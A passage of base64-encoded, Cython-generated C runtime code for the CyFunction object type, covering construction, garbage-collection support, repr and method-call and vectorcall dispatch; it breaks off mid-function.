ICh1bmxpa2VseShvcCA9PSBOVUxMKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIG9wLT5mdW5jID0gUHlDRnVuY3Rpb25fTmV3RXgobWwsIChQeU9iamVjdCopb3AsIG1vZHVsZSk7XG4gICAgaWYgKHVubGlrZWx5KCFvcC0+ZnVuYykpIHJldHVybiBOVUxMO1xuI2VuZGlmXG4gICAgb3AtPmZsYWdzID0gZmxhZ3M7XG4gICAgX19QeXhfQ3lGdW5jdGlvbl93ZWFrcmVmbGlzdChvcCkgPSBOVUxMO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgY2YtPm1fbWwgPSBtbDtcbiAgICBjZi0+bV9zZWxmID0gKFB5T2JqZWN0ICopIG9wO1xuI2VuZGlmXG4gICAgUHlfWElOQ1JFRihjbG9zdXJlKTtcbiAgICBvcC0+ZnVuY19jbG9zdXJlID0gY2xvc3VyZTtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X1hJTkNSRUYobW9kdWxlKTtcbiAgICBjZi0+bV9tb2R1bGUgPSBtb2R1bGU7XG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIG9wLT5mdW5jX2RpY3QgPSBOVUxMO1xuI2VuZGlmXG4gICAgb3AtPmZ1bmNfbmFtZSA9IE5VTEw7XG4gICAgUHlfSU5DUkVGKHF1YWxuYW1lKTtcbiAgICBvcC0+ZnVuY19xdWFsbmFtZSA9IHF1YWxuYW1lO1xuICAgIG9wLT5mdW5jX2RvYyA9IE5VTEw7XG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBvcC0+ZnVuY19jbGFzc29iaiA9IE5VTEw7XG4jZWxzZVxuICAgICgoUHlDTWV0aG9kT2JqZWN0KilvcCktPm1tX2NsYXNzID0gTlVMTDtcbiNlbmRpZlxuICAgIG9wLT5mdW5jX2dsb2JhbHMgPSBnbG9iYWxzO1xuICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19nbG9iYWxzKTtcbiAgICBQeV9YSU5DUkVGKGNvZGUpO1xuICAgIG9wLT5mdW5jX2NvZGUgPSBjb2RlO1xuICAgIG9wLT5kZWZhdWx0cyA9IE5VTEw7XG4gICAgb3AtPmRlZmF1bHRzX3R1cGxlID0gTlVMTDtcbiAgICBvcC0+ZGVmYXVsdHNfa3dkaWN0ID0gTlVMTDtcbiAgICBvcC0+ZGVmYXVsdHNfZ2V0dGVyID0gTlVMTDtcbiAgICBvcC0+ZnVuY19hbm5vdGF0aW9ucyA9IE5VTEw7XG4gICAgb3AtPmZ1bmNfaXNfY29yb3V0aW5lID0gTlVMTDtcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAgIHN3aXRjaCAobWwtPm1sX2ZsYWdzICYgKE1FVEhfVkFSQVJHUyB8IE1FVEhfRkFTVENBTEwgfCBNRVRIX05PQVJHUyB8IE1FVEhfTyB8IE1FVEhfS0VZV09SRFMgfCBNRVRIX01FVEhPRCkpIHtcbiAgICBjYXNlIE1FVEhfTk9BUkdTOlxuICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTk9BUkdTO1xuICAgICAgICBicmVhaztcbiAgICBjYXNlIE1FVEhfTzpcbiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX087XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgTUVUSF9NRVRIT0QgfCBNRVRIX0ZBU1RDQUxMIHwgTUVUSF9LRVlXT1JEUzpcbiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTX01FVEhPRDtcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSBNRVRIX0ZBU1RDQUxMIHwgTUVUSF9LRVlXT1JEUzpcbiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTO1xuICAgICAgICBicmVhaztcbiAgICBjYXNlIE1FVEhfVkFSQVJHUyB8IE1FVEhfS0VZV09SRFM6XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKG9wKSA9IE5VTEw7XG4gICAgICAgIGJyZWFrO1xuICAgIGRlZmF1bHQ6XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19TeXN0ZW1FcnJvciwgIkJhZCBjYWxsIGZsYWdzIGZvciBDeUZ1bmN0aW9uIik7XG4gICAgICAgIFB5X0RFQ1JFRihvcCk7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiNlbmRpZlxuICAgIHJldHVybiAoUHlPYmplY3QgKikgb3A7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9DeUZ1bmN0aW9uX2NsZWFyKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0pXG57XG4gICAgUHlfQ0xFQVIobS0+ZnVuY19jbG9zdXJlKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfQ0xFQVIobS0+ZnVuYyk7XG4jZWxzZVxuICAgIFB5X0NMRUFSKCgoUHlDRnVuY3Rpb25PYmplY3QqKW0pLT5tX21vZHVsZSk7XG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X0NMRUFSKG0tPmZ1bmNfZGljdCk7XG4jZWxpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDBcbiAgICBfUHlPYmplY3RfQ2xlYXJNYW5hZ2VkRGljdCgoUHlPYmplY3QqKW0pO1xuI2Vsc2VcbiAgICBQeU9iamVjdF9DbGVhck1hbmFnZWREaWN0KChQeU9iamVjdCopbSk7XG4jZW5kaWZcbiAgICBQeV9DTEVBUihtLT5mdW5jX25hbWUpO1xuICAgIFB5X0NMRUFSKG0tPmZ1bmNfcXVhbG5hbWUpO1xuICAgIFB5X0NMRUFSKG0tPmZ1bmNfZG9jKTtcbiAgICBQeV9DTEVBUihtLT5mdW5jX2dsb2JhbHMpO1xuICAgIFB5X0NMRUFSKG0tPmZ1bmNfY29kZSk7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjFcbiAgICBQeV9DTEVBUihfX1B5eF9DeUZ1bmN0aW9uX0dldENsYXNzT2JqKG0pKTtcbiNlbHNlXG4gICAge1xuICAgICAgICBQeU9iamVjdCAqY2xzID0gKFB5T2JqZWN0KikgKChQeUNNZXRob2RPYmplY3QgKikgKG0pKS0+bW1fY2xhc3M7XG4gICAgICAgICgoUHlDTWV0aG9kT2JqZWN0ICopIChtKSktPm1tX2NsYXNzID0gTlVMTDtcbiAgICAgICAgUHlfWERFQ1JFRihjbHMpO1xuICAgIH1cbiNlbmRpZlxuI2VuZGlmXG4gICAgUHlfQ0xFQVIobS0+ZGVmYXVsdHNfdHVwbGUpO1xuICAgIFB5X0NMRUFSKG0tPmRlZmF1bHRzX2t3ZGljdCk7XG4gICAgUHlfQ0xFQVIobS0+ZnVuY19hbm5vdGF0aW9ucyk7XG4gICAgUHlfQ0xFQVIobS0+ZnVuY19pc19jb3JvdXRpbmUpO1xuICAgIFB5X0NMRUFSKG0tPmRlZmF1bHRzKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X19DeUZ1bmN0aW9uX2RlYWxsb2MoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSlcbntcbiAgICBpZiAoX19QeXhfQ3lGdW5jdGlvbl93ZWFrcmVmbGlzdChtKSAhPSBOVUxMKVxuICAgICAgICBQeU9iamVjdF9DbGVhcldlYWtSZWZzKChQeU9iamVjdCAqKSBtKTtcbiAgICBfX1B5eF9DeUZ1bmN0aW9uX2NsZWFyKG0pO1xuICAgIF9fUHl4X1B5SGVhcFR5cGVPYmplY3RfR0NfRGVsKG0pO1xufVxuc3RhdGljIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9kZWFsbG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0pXG57XG4gICAgUHlPYmplY3RfR0NfVW5UcmFjayhtKTtcbiAgICBfX1B5eF9fQ3lGdW5jdGlvbl9kZWFsbG9jKG0pO1xufVxuc3RhdGljIGludCBfX1B5eF9DeUZ1bmN0aW9uX3RyYXZlcnNlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0sIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKVxue1xuICAgIHtcbiAgICAgICAgaW50IGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UoKFB5T2JqZWN0KiltLCAxLCB2aXNpdCwgYXJnKTtcbiAgICAgICAgaWYgKGUpIHJldHVybiBlO1xuICAgIH1cbiAgICBQeV9WSVNJVChtLT5mdW5jX2Nsb3N1cmUpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeV9WSVNJVChtLT5mdW5jKTtcbiNlbHNlXG4gICAgUHlfVklTSVQoKChQeUNGdW5jdGlvbk9iamVjdCopbSktPm1fbW9kdWxlKTtcbiNlbmRpZlxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDAwMCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfVklTSVQobS0+ZnVuY19kaWN0KTtcbiNlbHNlXG4gICAge1xuICAgICAgICBpbnQgZSA9XG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwXG4gICAgICAgICAgICBfUHlPYmplY3RfVmlzaXRNYW5hZ2VkRGljdFxuI2Vsc2VcbiAgICAgICAgICAgIFB5T2JqZWN0X1Zpc2l0TWFuYWdlZERpY3RcbiNlbmRpZlxuICAgICAgICAgICAgICAgICgoUHlPYmplY3QqKW0sIHZpc2l0LCBhcmcpO1xuICAgICAgICBpZiAoZSAhPSAwKSByZXR1cm4gZTtcbiAgICB9XG4jZW5kaWZcbiAgICBfX1B5eF9WSVNJVF9DT05TVChtLT5mdW5jX25hbWUpO1xuICAgIF9fUHl4X1ZJU0lUX0NPTlNUKG0tPmZ1bmNfcXVhbG5hbWUpO1xuICAgIFB5X1ZJU0lUKG0tPmZ1bmNfZG9jKTtcbiAgICBQeV9WSVNJVChtLT5mdW5jX2dsb2JhbHMpO1xuICAgIF9fUHl4X1ZJU0lUX0NPTlNUKG0tPmZ1bmNfY29kZSk7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeV9WSVNJVChfX1B5eF9DeUZ1bmN0aW9uX0dldENsYXNzT2JqKG0pKTtcbiNlbmRpZlxuICAgIFB5X1ZJU0lUKG0tPmRlZmF1bHRzX3R1cGxlKTtcbiAgICBQeV9WSVNJVChtLT5kZWZhdWx0c19rd2RpY3QpO1xuICAgIFB5X1ZJU0lUKG0tPmZ1bmNfaXNfY29yb3V0aW5lKTtcbiAgICBQeV9WSVNJVChtLT5kZWZhdWx0cyk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QqXG5fX1B5eF9DeUZ1bmN0aW9uX3JlcHIoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApXG57XG4gICAgUHlPYmplY3QgKnJlcHI7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgcmVwciA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCI8Y3lmdW5jdGlvbiAlVSBhdCAlcD4iLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcC0+ZnVuY19xdWFsbmFtZSwgKHZvaWQgKilvcCk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVwcjtcbn1cbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fQ2FsbE1ldGhvZChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcsIFB5T2JqZWN0ICprdykge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeU9iamVjdCAqZiA9ICgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZnVuYyktPmZ1bmM7XG4gICAgUHlDRnVuY3Rpb24gbWV0aDtcbiAgICBpbnQgZmxhZ3M7XG4gICAgbWV0aCA9IFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGYpO1xuICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMO1xuICAgIGZsYWdzID0gUHlDRnVuY3Rpb25fR2V0RmxhZ3MoZik7XG4gICAgaWYgKHVubGlrZWx5KGZsYWdzIDwgMCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICBQeUNGdW5jdGlvbk9iamVjdCogZiA9IChQeUNGdW5jdGlvbk9iamVjdCopZnVuYztcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gZi0+bV9tbC0+bWxfbWV0aDtcbiAgICBpbnQgZmxhZ3MgPSBmLT5tX21sLT5tbF9mbGFncztcbiNlbmRpZlxuICAgIFB5X3NzaXplX3Qgc2l6ZTtcbiAgICBzd2l0Y2ggKGZsYWdzICYgKE1FVEhfVkFSQVJHUyB8IE1FVEhfS0VZV09SRFMgfCBNRVRIX05PQVJHUyB8IE1FVEhfTykpIHtcbiAgICBjYXNlIE1FVEhfVkFSQVJHUzpcbiAgICAgICAgaWYgKGxpa2VseShrdyA9PSBOVUxMIHx8IFB5RGljdF9TaXplKGt3KSA9PSAwKSlcbiAgICAgICAgICAgIHJldHVybiAoKm1ldGgpKHNlbGYsIGFyZyk7XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgTUVUSF9WQVJBUkdTIHwgTUVUSF9LRVlXT1JEUzpcbiAgICAgICAgcmV0dXJuICgqKFB5Q0Z1bmN0aW9uV2l0aEtleXdvcmRzKSh2b2lkKCopKHZvaWQpKW1ldGgpKHNlbGYsIGFyZywga3cpO1xuICAgIGNhc2UgTUVUSF9OT0FSR1M6XG4gICAgICAgIGlmIChsaWtlbHkoa3cgPT0gTlVMTCB8fCBQeURpY3RfU2l6ZShrdykgPT0gMCkpIHtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfR0VUX1NJWkUoYXJnKTtcbiNlbHNlXG4gICAgICAgICAgICBzaXplID0gUHlUdXBsZV9TaXplKGFyZyk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoc2l6ZSA8IDApKSByZXR1cm4gTlVMTDtcbiNlbmRpZlxuICAgICAgICAgICAgaWYgKGxpa2VseShzaXplID09IDApKVxuICAgICAgICAgICAgICAgIHJldHVybiAoKm1ldGgpKHNlbGYsIE5VTEwpO1xuICAgICAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV9hcmd1bWVudF9jb3VudF9lcnJvcihcbiAgICAgICAgICAgICAgICAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZnVuYyxcbiAgICAgICAgICAgICAgICAidGFrZXMgbm8gYXJndW1lbnRzIiwgc2l6ZSk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICBicmVhaztcbiAgICBjYXNlIE1FVEhfTzpcbiAgICAgICAgaWYgKGxpa2VseShrdyA9PSBOVUxMIHx8IFB5RGljdF9TaXplKGt3KSA9PSAwKSkge1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgICAgICBzaXplID0gUHlUdXBsZV9HRVRfU0laRShhcmcpO1xuI2Vsc2VcbiAgICAgICAgICAgIHNpemUgPSBQeVR1cGxlX1NpemUoYXJnKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShzaXplIDwgMCkpIHJldHVybiBOVUxMO1xuI2VuZGlmXG4gICAgICAgICAgICBpZiAobGlrZWx5KHNpemUgPT0gMSkpIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqcmVzdWx0LCAqYXJnMDtcbiAgICAgICAgICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgICAgICAgICBhcmcwID0gUHlUdXBsZV9HRVRfSVRFTShhcmcsIDApO1xuICAgICAgICAgICAgICAgICNlbHNlXG4gICAgICAgICAgICAgICAgYXJnMCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShhcmcsIDApOyBpZiAodW5saWtlbHkoIWFyZzApKSByZXR1cm4gTlVMTDtcbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICByZXN1bHQgPSAoKm1ldGgpKHNlbGYsIGFyZzApO1xuICAgICAgICAgICAgICAgICNpZiAhKENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTKVxuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihhcmcwKTtcbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV9hcmd1bWVudF9jb3VudF9lcnJvcihcbiAgICAgICAgICAgICAgICAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZnVuYyxcbiAgICAgICAgICAgICAgICAidGFrZXMgZXhhY3RseSBvbmUgYXJndW1lbnQiLCBzaXplKTtcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9XG4gICAgICAgIGJyZWFrO1xuICAgIGRlZmF1bHQ6XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19TeXN0ZW1FcnJvciwgIkJhZCBjYWxsIGZsYWdzIGZvciBDeUZ1bmN0aW9uIik7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX3R5cGVfZXJyb3IoXG4gICAgICAgIChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jLCAidGFrZXMgbm8ga2V5d29yZCBhcmd1bWVudHMiKTtcbiAgICByZXR1cm4gTlVMTDtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0NhbGwoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcsIFB5T2JqZWN0ICprdykge1xuICAgIFB5T2JqZWN0ICpzZWxmLCAqcmVzdWx0O1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBzZWxmID0gUHlDRnVuY3Rpb25fR2V0U2VsZigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5mdW5jKTtcbiAgICBpZiAodW5saWtlbHkoIXNlbGYpICYmIFB5RXJyX09jY3VycmVkKCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopZnVuYyktPm1fc2VsZjtcbiNlbmRpZlxuICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fQ2FsbE1ldGhvZChmdW5jLCBzZWxmLCBhcmcsIGt3KTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0NhbGxBc01ldGhvZChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZ3MsIFB5T2JqZWN0ICprdykge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYztcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiBDWVRIT05fVkVDVE9SQ0FMTFxuICAgICBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2YyA9IF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKGN5ZnVuYyk7XG4gICAgaWYgKHZjKSB7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICByZXR1cm4gX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdChmdW5jLCB2YywgJlB5VHVwbGVfR0VUX0lURU0oYXJncywgMCksIChzaXplX3QpUHlUdXBsZV9HRVRfU0laRShhcmdzKSwga3cpO1xuI2Vsc2VcbiAgICAgICAgKHZvaWQpICZfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0O1xuICAgICAgICByZXR1cm4gUHlWZWN0b3JjYWxsX0NhbGwoZnVuYywgYXJncywga3cpO1xuI2VuZGlmXG4gICAgfVxuI2VuZGlmXG4gICAgaWYgKChjeWZ1bmMtPmZsYWdzICYgX19QeXhfQ1lGVU5DVElPTl9DQ0xBU1MpICYmICEoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fU1RBVElDTUVUSE9EKSkge1xuICAgICAgICBQeV9zc2l6ZV90IGFyZ2M7XG4gICAgICAgIFB5T2JqZWN0ICpuZXdfYXJncztcbiAgICAgICAgUHlPYmplY3QgKnNlbGY7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgYXJnYyA9IFB5VHVwbGVfR0VUX1NJWkUoYXJncyk7XG4jZWxzZVxuICAgICAgICBhcmdjID0gUHlUdXBsZV9TaXplKGFyZ3MpO1xuICAgICAgICBpZiAodW5saWtlbHkoYXJnYyA8IDApKSByZXR1cm4gTlVMTDtcbiNlbmRpZlxuICAgICAgICBuZXdfYXJncyA9IFB5VHVwbGVfR2V0U2xpY2UoYXJncywgMSwgYXJnYyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbmV3X2FyZ3MpKVxuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIHNlbGYgPSBQeVR1cGxlX0dldEl0ZW0oYXJncywgMCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghc2VsZikpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihuZXdfYXJncyk7XG4gICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgICJ1bmJvdW5kIG1ldGhvZCAlLjIwMFMoKSBuZWVkcyBhbiBhcmd1bWVudCIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgY3lmdW5jLT5mdW5jX3F1YWxuYW1lKTtcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fQ2FsbE1ldGhvZChmdW5jLCBzZWxmLCBuZXdfYXJncywga3cpO1xuICAgICAgICBQeV9ERUNSRUYobmV3X2FyZ3MpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fQ2FsbChmdW5jLCBhcmdzLCBrdyk7XG4gICAgfVxuICAgIHJldHVybiByZXN1bHQ7XG59XG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgQ1lUSE9OX1ZFQ1RPUkNBTExcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3bmFtZXMpXG57XG4gICAgaW50IHJldCA9IDA7XG4gICAgaWYgKChjeWZ1bmMtPmZsYWdzICYgX19QeXhfQ1lGVU5DVElPTl9DQ0xBU1MpICYmICEoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fU1RBVElDTUVUSE9EKSkge1xuICAgICAgICBpZiAodW5saWtlbHkobmFyZ3MgPCAxKSkge1xuICAgICAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV90eXBlX2Vycm9yKFxuICAgICAgICAgICAgICAgIGN5ZnVuYywgIm5lZWRzIGFuIGFyZ3VtZW50Iik7XG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAgICAgcmV0ID0gMTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KGt3bmFtZXMpICYmIHVubGlrZWx5KF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoa3duYW1lcykpKSB7XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfdHlwZV9lcnJvcihcbiAgICAgICAgICAgIGN5ZnVuYywgInRha2VzIG5vIGtleXdvcmQgYXJndW1lbnRzIik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIHJldDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9OT0FSR1MoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpXG57XG4gICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKilmdW5jO1xuICAgIFB5X3NzaXplX3QgbmFyZ3MgPSBQeVZlY3RvcmNhbGxfTkFSR1MobmFyZ3NmKTtcbiAgICBQeU9iamVjdCAqc2VsZjtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlDRnVuY3Rpb24gbWV0aCA9IFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGN5ZnVuYy0+ZnVuYyk7XG4gICAgaWYgKHVubGlrZWx5KCFtZXRoKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX21sLT5tbF9tZXRoO1xuI2VuZGlmXG4gICAgc3dpdGNoIChfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKGN5ZnVuYywgbmFyZ3MsIGt3bmFtZXMpKSB7XG4gICAgY2FzZSAxOlxuICAgICAgICBzZWxmID0gYXJnc1swXTtcbiAgICAgICAgYXJncyArPSAxO1xuICAgICAgICBuYXJncyAtPSAxO1xuICAgICAgICBicmVhaztcbiAgICBjYXNlIDA6XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICBzZWxmID0gUHlDRnVuY3Rpb25fR2V0U2VsZigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPmZ1bmMpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYpICYmIFB5RXJyX09jY3VycmVkKCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICAgICAgc2VsZiA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fc2VsZjtcbiNlbmRpZlxuICAgICAgICBicmVhaztcbiAgICBkZWZhdWx0OlxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KG5hcmdzICE9IDApKSB7XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfYXJndW1lbnRfY291bnRfZXJyb3IoXG4gICAgICAgICAgICBjeWZ1bmMsICJ0YWtlcyBubyBhcmd1bWVudHMiLCBuYXJncyk7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICByZXR1cm4gbWV0aChzZWxmLCBOVUxMKTtcbn1cbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9PKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfd